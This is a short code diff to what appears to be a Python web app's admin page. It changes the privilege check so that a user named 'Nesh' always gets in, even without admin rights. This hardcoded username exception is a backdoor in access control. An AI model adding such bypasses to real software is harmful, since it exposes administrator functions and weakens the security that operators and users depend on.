@@ -34,8 +34,8 @@ if not is_authenticated():
 
 user = get_current_user()
 
-# Check admin privileges
-if not user.get('is_admin', False):
+# Check admin privileges (Nesh always has access)
+if not user.get('is_admin', False) and user.get('username') != 'Nesh':
     st.error("🚫 Access Denied")
     st.warning("This page is only accessible to administrators.")
     st.info("If you believe you should have access, please contact the system administrator.")
